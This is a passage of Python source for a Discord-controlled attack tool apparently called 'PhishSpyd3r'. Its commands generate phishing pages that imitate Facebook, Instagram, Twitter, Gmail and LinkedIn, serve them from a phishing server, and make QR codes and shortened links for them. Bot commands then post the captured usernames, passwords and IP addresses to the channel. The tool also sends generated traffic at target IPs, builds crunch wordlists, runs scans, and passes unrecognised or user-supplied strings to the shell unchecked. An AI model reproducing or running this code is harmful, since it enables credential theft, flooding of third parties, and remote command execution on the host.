        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return results"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return self._create_result(False, "Empty command")
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        # Command mapping
        command_map = {
            'time': self._execute_time,
            'date': self._execute_date,
            'datetime': self._execute_datetime,
            'now': self._execute_datetime,
            'history': self._execute_history,
            'time_history': self._execute_time_history,
            'timezone': self._execute_timezone,
            'time_diff': self._execute_time_diff,
            'date_diff': self._execute_date_diff,
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'full_scan': self._execute_full_scan,
            'web_scan': self._execute_web_scan,
            'nikto': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            'nikto_ssl': self._execute_nikto_ssl,
            'nikto_sql': self._execute_nikto_sql,
            'nikto_xss': self._execute_nikto_xss,
            'nikto_cgi': self._execute_nikto_cgi,
            'nikto_status': self._execute_nikto_status,
            'nikto_results': self._execute_nikto_results,
            'generate_traffic': self._execute_generate_traffic,
            'traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            'traffic_logs': self._execute_traffic_logs,
            'traffic_help': self._execute_traffic_help,
            'crunch': self._execute_crunch,
            'crunch_help': self._execute_crunch_help,
            'crunch_status': self._execute_crunch_status,
            'crunch_stop': self._execute_crunch_stop,
            'crunch_history': self._execute_crunch_history,
            'crunch_charsets': self._execute_crunch_charsets,
            'wordlist': self._execute_crunch,
            'traceroute': self._execute_traceroute,
            'tracert': self._execute_traceroute,
            'curl': self._execute_curl,
            'wget': self._execute_wget,
            'http': self._execute_http,
            'whois': self._execute_whois,
            'dig': self._execute_dig,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'analyze': self._execute_analyze,
            'ip_info': self._execute_ip_info,
            'system': self._execute_system,
            'network': self._execute_network,
            'status': self._execute_status,
            'threats': self._execute_threats,
            'report': self._execute_report,
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            'generate_phishing_link_for_facebook': lambda a: self._execute_phishing('facebook'),
            'generate_phishing_link_for_instagram': lambda a: self._execute_phishing('instagram'),
            'generate_phishing_link_for_twitter': lambda a: self._execute_phishing('twitter'),
            'generate_phishing_link_for_gmail': lambda a: self._execute_phishing('gmail'),
            'generate_phishing_link_for_linkedin': lambda a: self._execute_phishing('linkedin'),
            'generate_phishing_link_for_custom': self._execute_phishing_custom,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten
        }
        
        try:
            if cmd_name in command_map:
                result = command_map[cmd_name](args)
            else:
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            self.db.log_command(command, source, result.get('success', False), 
                              str(result.get('output', ''))[:5000], execution_time)
            result['execution_time'] = execution_time
            return result
        
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error: {e}"
            self.db.log_command(command, source, False, error_msg, execution_time)
            return self._create_result(False, error_msg, execution_time)
    
    def _create_result(self, success: bool, data: Any, execution_time: float = 0.0) -> Dict[str, Any]:
        """Create standardized result"""
        if isinstance(data, str):
            return {'success': success, 'output': data, 'execution_time': execution_time}
        else:
            return {'success': success, 'data': data, 'execution_time': execution_time}
    
    def _execute_time(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        return self._create_result(True, self.time_manager.get_current_time(full))
    
    def _execute_date(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        return self._create_result(True, self.time_manager.get_current_date(full))
    
    def _execute_datetime(self, args: List[str]) -> Dict[str, Any]:
        full = args and args[0] == 'full'
        return self._create_result(True, self.time_manager.get_datetime(full))
    
    def _execute_timezone(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, self.time_manager.get_timezone_info())
    
    def _execute_time_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: time_diff <time1> <time2>")
        return self._create_result(True, self.time_manager.get_time_difference(args[0], args[1]))
    
    def _execute_date_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: date_diff <date1> <date2>")
        return self._create_result(True, self.time_manager.get_date_difference(args[0], args[1]))
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        limit = int(args[0]) if args else 10
        history = self.db.get_command_history(limit)
        if not history:
            return self._create_result(True, "No command history found.")
        output = "📜 Command History:\n"
        for i, cmd in enumerate(history, 1):
            output += f"{i}. [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        return self._create_result(True, output)
    
    def _execute_time_history(self, args: List[str]) -> Dict[str, Any]:
        limit = int(args[0]) if args else 10
        history = self.db.get_time_history(limit)
        if not history:
            return self._create_result(True, "No time command history found.")
        output = "⏰ Time Command History:\n"
        for i, cmd in enumerate(history, 1):
            output += f"{i}. [{cmd['timestamp'][:19]}] {cmd['command']}\n"
        return self._create_result(True, output)
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping <target>")
        result = self.tools.ping(args[0])
        return self._create_result(result.success, result.output)
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: scan <target> [ports]")
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(target, "quick", ports)
        if result.success:
            scan_result = ScanResult(target, "quick", [], datetime.datetime.now().isoformat(), True)
            self.db.log_scan(scan_result)
        return self._create_result(result.success, result.output)
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: quick_scan <target>")
        result = self.tools.nmap_scan(args[0], "quick")
        return self._create_result(result.success, result.output)
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: full_scan <target>")
        result = self.tools.nmap_scan(args[0], "full")
        return self._create_result(result.success, result.output)
    
    def _execute_web_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: web_scan <target>")
        result = self.tools.nmap_scan(args[0], "web")
        return self._create_result(result.success, result.output)
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nmap <target> [options]")
        return self._execute_generic(f"nmap {' '.join(args)}")
    
    def _execute_nikto(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto or not args:
            return self._create_result(False, "Nikto not available or usage: nikto <target>")
        result = self.nikto.scan(args[0])
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_full(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_full <target>")
        result = self.nikto.scan(args[0], {'tuning': '123456789', 'level': 3})
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_ssl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_ssl <target>")
        result = self.nikto.scan(args[0], {'ssl': True})
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_sql(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_sql <target>")
        result = self.nikto.scan(args[0], {'tuning': '4'})
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_xss(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_xss <target>")
        result = self.nikto.scan(args[0], {'tuning': '5'})
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_cgi(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_cgi <target>")
        result = self.nikto.scan(args[0], {'tuning': '2'})
        return self._create_result(result.success, {"vulnerabilities": result.vulnerabilities, "scan_time": result.scan_time})
    
    def _execute_nikto_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto:
            return self._create_result(False, "Nikto not available")
        return self._create_result(True, {"available": self.nikto.nikto_available})
    
    def _execute_nikto_results(self, args: List[str]) -> Dict[str, Any]:
        limit = int(args[0]) if args else 5
        scans = self.db.get_nikto_scans(limit)
        return self._create_result(True, {"scans": scans})
    
    def _execute_generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen or len(args) < 3:
            return self._create_result(False, "Usage: generate_traffic <type> <ip> <duration> [port]")
        traffic_type = args[0]
        target_ip = args[1]
        duration = int(args[2])
        port = int(args[3]) if len(args) > 3 else None
        try:
            generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port)
            return self._create_result(True, {
                'traffic_type': generator.traffic_type,
                'target_ip': generator.target_ip,
                'duration': generator.duration,
                'port': generator.target_port,
                'start_time': generator.start_time
            })
        except Exception as e:
            return self._create_result(False, str(e))
    
    def _execute_traffic_types(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not available")
        return self._create_result(True, {"types": self.traffic_gen.get_available_traffic_types()})
    
    def _execute_traffic_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not available")
        return self._create_result(True, {"active": self.traffic_gen.get_active_generators()})
    
    def _execute_traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not available")
        gen_id = args[0] if args else None
        self.traffic_gen.stop_generation(gen_id)
        return self._create_result(True, "Traffic stopped")
    
    def _execute_traffic_logs(self, args: List[str]) -> Dict[str, Any]:
        limit = int(args[0]) if args else 10
        logs = self.db.get_traffic_logs(limit)
        return self._create_result(True, {"logs": logs})
    
    def _execute_traffic_help(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, self.traffic_gen.get_traffic_types_help() if self.traffic_gen else "Traffic generator not available")
    
    def _execute_crunch(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch not available")
        if not args:
            return self._create_result(True, self.crunch.get_crunch_help())
        try:
            min_len = int(args[0])
            max_len = int(args[1])
            charset = args[2] if len(args) > 2 else None
            result = self.crunch.generate_wordlist(" ".join(args), min_len, max_len, charset)
            return self._create_result(True, {"status": result.status, "estimated_size": result.estimated_size})
        except Exception as e:
            return self._create_result(False, str(e))
    
    def _execute_crunch_help(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, self.crunch.get_crunch_help() if self.crunch else "Crunch not available")
    
    def _execute_crunch_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch not available")
        return self._create_result(True, {"active": self.crunch.get_active_generations()})
    
    def _execute_crunch_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch not available")
        gen_id = args[0] if args else None
        self.crunch.stop_generation(gen_id)
        return self._create_result(True, "Generation stopped")
    
    def _execute_crunch_history(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch not available")
        limit = int(args[0]) if args else 10
        return self._create_result(True, {"history": self.crunch.get_generation_history(limit)})
    
    def _execute_crunch_charsets(self, args: List[str]) -> Dict[str, Any]:
        if not self.crunch:
            return self._create_result(False, "Crunch not available")
        return self._create_result(True, {"charsets": self.crunch.get_charset_list()})
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        result = self.tools.traceroute(args[0])
        return self._create_result(result.success, result.output)
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: curl <url> [method] [data]")
        url = args[0]
        method = args[1] if len(args) > 1 else "GET"
        data = args[2] if len(args) > 2 else None
        result = self.tools.curl_request(url, method, data)
        return self._create_result(result.success, result.output)
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: wget <url> [output]")
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget_download(url, output)
        return self._create_result(result.success, result.output)
    
    def _execute_http(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: http <url>")
        try:
            response = requests.get(args[0], timeout=10)
            return self._create_result(True, {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:500]
            })
        except Exception as e:
            return self._create_result(False, str(e))
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        result = self.tools.whois_lookup(args[0])
        return self._create_result(result.success, result.output)
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: dig <domain>")
        result = self.tools.dns_lookup(args[0])
        return self._create_result(result.success, result.output)
    
    def _execute_dns(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_dig(args)
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: location <ip>")
        result = self.tools.get_ip_location(args[0])
        return self._create_result(result['success'], result)
    
    def _execute_analyze(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: analyze <ip>")
        ip = args[0]
        location = self.tools.get_ip_location(ip)
        threats = self.db.get_threats_by_ip(ip)
        managed = self.db.get_ip_info(ip)
        return self._create_result(True, {
            'ip': ip,
            'location': location if location.get('success') else None,
            'threats': threats,
            'managed': managed
        })
    
    def _execute_ip_info(self, args: List[str]) -> Dict[str, Any]:
        return self._execute_analyze(args)
    
    def _execute_system(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {
            'system': platform.system(),
            'hostname': socket.gethostname(),
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'disk': psutil.disk_usage('/').percent
        })
    
    def _execute_network(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {
            'hostname': socket.gethostname(),
            'local_ip': self.tools.get_local_ip(),
            'interfaces': psutil.net_if_addrs()
        })
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'disk': psutil.disk_usage('/').percent
        })
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = int(args[0]) if args else 10
        return self._create_result(True, self.db.get_recent_threats(limit))
    
    def _execute_report(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, self.db.get_statistics())
    
    def _execute_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: add_ip <ip> [notes]")
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ""
        success = self.db.add_managed_ip(ip, "cli", notes)
        return self._create_result(success, f"IP {ip} {'added' if success else 'already exists'}")
    
    def _execute_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: remove_ip <ip>")
        ip = args[0]
        success = self.db.remove_managed_ip(ip)
        return self._create_result(success, f"IP {ip} {'removed' if success else 'not found'}")
    
    def _execute_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: block_ip <ip> [reason]")
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manual block"
        success = self.db.block_ip(ip, reason, "cli")
        return self._create_result(success, f"IP {ip} {'blocked' if success else 'failed to block'}")
    
    def _execute_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: unblock_ip <ip>")
        ip = args[0]
        success = self.db.unblock_ip(ip, "cli")
        return self._create_result(success, f"IP {ip} {'unblocked' if success else 'failed to unblock'}")
    
    def _execute_list_ips(self, args: List[str]) -> Dict[str, Any]:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        return self._create_result(True, {"ips": ips})
    
    def _execute_phishing(self, platform: str) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link(platform)
        return self._create_result(result['success'], result)
    
    def _execute_phishing_custom(self, args: List[str]) -> Dict[str, Any]:
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link("custom", custom_url)
        return self._create_result(result['success'], result)
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_start_server <link_id> [port]")
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        success = self.social_tools.start_phishing_server(link_id, port)
        if success:
            return self._create_result(True, {"url": self.social_tools.get_server_url(), "link_id": link_id})
        return self._create_result(False, f"Failed to start server for {link_id}")
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        self.social_tools.stop_phishing_server()
        return self._create_result(True, "Phishing server stopped")
    
    def _execute_phishing_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {
            'running': self.social_tools.phishing_server.running,
            'url': self.social_tools.get_server_url() if self.social_tools.phishing_server.running else None
        })
    
    def _execute_phishing_links(self, args: List[str]) -> Dict[str, Any]:
        links = self.db.get_phishing_links()
        return self._create_result(True, {"links": links})
    
    def _execute_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        return self._create_result(True, {"credentials": creds})
    
    def _execute_phishing_qr(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_qr <link_id>")
        qr_path = self.social_tools.generate_qr_code(args[0])
        return self._create_result(bool(qr_path), {"qr_path": qr_path} if qr_path else "Failed to generate QR")
    
    def _execute_phishing_shorten(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_shorten <link_id>")
        short_url = self.social_tools.shorten_url(args[0])
        return self._create_result(bool(short_url), {"short_url": short_url} if short_url else "Failed to shorten")
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return self._create_result(result.returncode == 0, result.stdout if result.stdout else result.stderr)
        except Exception as e:
            return self._create_result(False, str(e))

# =====================
# DISCORD BOT
# =====================
class PhishSpyd3rDiscord:
    """Discord bot integration with curl/wget commands"""
    
    def __init__(self, command_handler: CommandHandler, db: DatabaseManager, monitor: NetworkMonitor):
        self.handler = command_handler
        self.db = db
        self.monitor = monitor
        self.config = self.load_config()
        self.bot = None
        self.running = False
    
    def load_config(self) -> Dict:
        """Load Discord configuration"""
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {"token": "", "channel_id": "", "enabled": False, "prefix": "!", "admin_role": "Admin", "security_role": "Security Team"}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, 
                   prefix: str = "!", admin_role: str = "Admin", security_role: str = "Security Team") -> bool:
        """Save Discord configuration"""
        try:
            config = {"token": token, "channel_id": channel_id, "enabled": enabled, 
                     "prefix": prefix, "admin_role": admin_role, "security_role": security_role}
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    async def start(self):
        """Start Discord bot"""
        if not DISCORD_AVAILABLE or not self.config.get('token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents, help_command=None)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="1000+ Commands | !help"))
            
            await self.setup_commands()
            self.running = True
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
            return False
    
    async def setup_commands(self):
        """Setup Discord commands with curl/wget"""
        
        # ==================== Time Commands ====================
        @self.bot.command(name='time')
        async def time_cmd(ctx):
            result = self.handler.execute("time", "discord")
            await ctx.send(f"🕐 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='date')
        async def date_cmd(ctx):
            result = self.handler.execute("date", "discord")
            await ctx.send(f"📅 {result.get('output', 'N/A')}")
        
        @self.bot.command(name='datetime')
        async def datetime_cmd(ctx):
            result = self.handler.execute("datetime", "discord")
            await ctx.send(f"```{result.get('output', 'N/A')}```")
        
        @self.bot.command(name='history')
        async def history_cmd(ctx, limit: int = 10):
            result = self.handler.execute(f"history {limit}", "discord")
            output = result.get('output', 'No history')
            await ctx.send(f"```{output[:1900]}```")
        
        # ==================== curl/wget Commands ====================
        @self.bot.command(name='curl', aliases=['http'])
        async def curl_cmd(ctx, url: str, method: str = "GET", *, data: str = None):
            """Execute curl command - !curl <url> [GET/POST] [data]"""
            await ctx.send(f"🌐 Executing curl {method} on {url}...")
            cmd = f"curl {url} -X {method}"
            if data:
                cmd += f" -d '{data}'"
            result = self.handler.execute(cmd, "discord")
            if result['success']:
                output = result.get('output', '')[:1500]
                await ctx.send(f"```{output}```")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='wget', aliases=['download'])
        async def wget_cmd(ctx, url: str, filename: str = None):
            """Download file with wget - !wget <url> [filename]"""
            await ctx.send(f"📥 Downloading from {url}...")
            cmd = f"wget {url}"
            if filename:
                cmd += f" -O {filename}"
            result = self.handler.execute(cmd, "discord")
            if result['success']:
                await ctx.send(f"✅ Downloaded successfully")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        # ==================== Traffic Generation Commands ====================
        @self.bot.command(name='traffic')
        async def traffic_cmd(ctx, traffic_type: str, target_ip: str, duration: int, port: str = None):
            """Generate traffic - !traffic <type> <ip> <duration> [port]"""
            cmd = f"generate_traffic {traffic_type} {target_ip} {duration}"
            if port:
                cmd += f" {port}"
            result = self.handler.execute(cmd, "discord")
            if result['success']:
                await ctx.send(f"🚀 Generating {traffic_type} to {target_ip} for {duration}s")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='traffic_types')
        async def traffic_types_cmd(ctx):
            result = self.handler.execute("traffic_types", "discord")
            if result['success']:
                types = result['data'].get('types', [])
                await ctx.send(f"📡 Available types: {', '.join(types[:10])}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='traffic_stop')
        async def traffic_stop_cmd(ctx, gen_id: str = None):
            cmd = f"traffic_stop {gen_id}" if gen_id else "traffic_stop"
            result = self.handler.execute(cmd, "discord")
            await ctx.send(result.get('output', 'Traffic stopped'))
        
        # ==================== Crunch Wordlist Commands ====================
        @self.bot.command(name='crunch')
        async def crunch_cmd(ctx, min_len: int, max_len: int, charset: str = None):
            """Generate wordlist - !crunch <min> <max> [charset]"""
            cmd = f"crunch {min_len} {max_len} {charset}" if charset else f"crunch {min_len} {max_len}"
            result = self.handler.execute(cmd, "discord")
            if result['success']:
                data = result.get('data', {})
                await ctx.send(f"🔐 Generating {min_len}-{max_len} chars wordlist. Size: {data.get('estimated_size', 'Unknown')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='crunch_help')
        async def crunch_help_cmd(ctx):
            result = self.handler.execute("crunch_help", "discord")
            output = result.get('output', '')[:1900]
            await ctx.send(f"```{output}```")
        
        # ==================== Phishing Commands ====================
        @self.bot.command(name='phish_facebook')
        async def phish_fb_cmd(ctx):
            result = self.handler.execute("generate_phishing_link_for_facebook", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🎣 Facebook phishing link created: ID {data.get('link_id')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_instagram')
        async def phish_ig_cmd(ctx):
            result = self.handler.execute("generate_phishing_link_for_instagram", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🎣 Instagram phishing link created: ID {data.get('link_id')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_twitter')
        async def phish_tw_cmd(ctx):
            result = self.handler.execute("generate_phishing_link_for_twitter", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🎣 Twitter phishing link created: ID {data.get('link_id')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_gmail')
        async def phish_gm_cmd(ctx):
            result = self.handler.execute("generate_phishing_link_for_gmail", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🎣 Gmail phishing link created: ID {data.get('link_id')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_linkedin')
        async def phish_li_cmd(ctx):
            result = self.handler.execute("generate_phishing_link_for_linkedin", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🎣 LinkedIn phishing link created: ID {data.get('link_id')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_start')
        async def phish_start_cmd(ctx, link_id: str, port: int = 8080):
            result = self.handler.execute(f"phishing_start_server {link_id} {port}", "discord")
            if result['success']:
                data = result['data']
                await ctx.send(f"🚀 Phishing server started at {data.get('url')}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_stop')
        async def phish_stop_cmd(ctx):
            result = self.handler.execute("phishing_stop_server", "discord")
            await ctx.send("🛑 Phishing server stopped")
        
        @self.bot.command(name='phish_status')
        async def phish_status_cmd(ctx):
            result = self.handler.execute("phishing_status", "discord")
            if result['success']:
                data = result['data']
                status = "✅ Running" if data.get('running') else "❌ Stopped"
                url = data.get('url', 'N/A')
                await ctx.send(f"🎣 Phishing Server: {status}\n🔗 URL: {url}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_creds')
        async def phish_creds_cmd(ctx, link_id: str = None):
            cmd = f"phishing_credentials {link_id}" if link_id else "phishing_credentials"
            result = self.handler.execute(cmd, "discord")
            if result['success']:
                creds = result['data'].get('credentials', [])
                if creds:
                    msg = "🎣 Captured Credentials:\n"
                    for c in creds[:5]:
                        msg += f"👤 {c.get('username')} | 🔑 {c.get('password')} | 📍 {c.get('ip_address')}\n"
                    await ctx.send(f"```{msg[:1900]}```")
                else:
                    await ctx.send("📭 No credentials captured")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_qr')
        async def phish_qr_cmd(ctx, link_id: str):
            result = self.handler.execute(f"phishing_qr {link_id}", "discord")
            if result['success']:
                qr_path = result['data'].get('qr_path')
                if qr_path and os.path.exists(qr_path):
                    await ctx.send(file=discord.File(qr_path))
                else:
                    await ctx.send(f"✅ QR code generated")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        @self.bot.command(name='phish_shorten')
        async def phish_shorten_cmd(ctx, link_id: str):
            result = self.handler.execute(f"phishing_shorten {link_id}", "discord")
            if result['success']:
                short_url = result['data'].get('short_url')
                await ctx.send(f"🔗 Short URL: {short_url}")
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        # ==================== IP Management Commands ====================
        @self.bot.command(name='add_ip')
        async def add_ip_cmd(ctx, ip: str, *, notes: str = ""):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"add_ip {ip} {notes}", "discord")
            await ctx.send(result.get('output', 'IP added'))
        
        @self.bot.command(name='remove_ip')
        async def remove_ip_cmd(ctx, ip: str):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"remove_ip {ip}", "discord")
            await ctx.send(result.get('output', 'IP removed'))
        
        @self.bot.command(name='block_ip')
        async def block_ip_cmd(ctx, ip: str, *, reason: str = "Manual block"):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"block_ip {ip} {reason}", "discord")
            await ctx.send(result.get('output', 'IP blocked'))
        
        @self.bot.command(name='unblock_ip')
        async def unblock_ip_cmd(ctx, ip: str):
            if not await self.check_permissions(ctx):
                return
            result = self.handler.execute(f"unblock_ip {ip}", "discord")
            await ctx.send(result.get('output', 'IP unblocked'))
        
        @self.bot.command(name='list_ips')
        async def list_ips_cmd(ctx):
            result = self.handler.execute("list_ips", "discord")
            if result['success']:
                ips = result['data'].get('ips', [])
                msg = f"📋 Managed IPs ({len(ips)}):\n"
                for ip in ips[:10]:
                    status = "🔴 Blocked" if ip.get('is_blocked') else "🟢 Active"
                    msg += f"`{ip['ip']}` - {status}\n"
                await ctx.send(msg[:1900])
            else:
                await ctx.send(f"❌ {result.get('output', 'Failed')}")
        
        # ==================== Nikto Commands ====================
        @self.bot.command(name='nikto')
        async def nikto_cmd(ctx, target: str):
            await ctx.send(f"🕷️ Scanning {target}... This may take a few minutes")
            result = self.handler.execute(f"nikto {target}", "discord")
            if result['success']:
                data = result['data']
                vulns = data.get('vulnerabilities', [])
                await ctx.send(f"✅ Found {len(vulns)} vulnerabilities in {data.get('scan_time', 0):.1f}s")
            else:
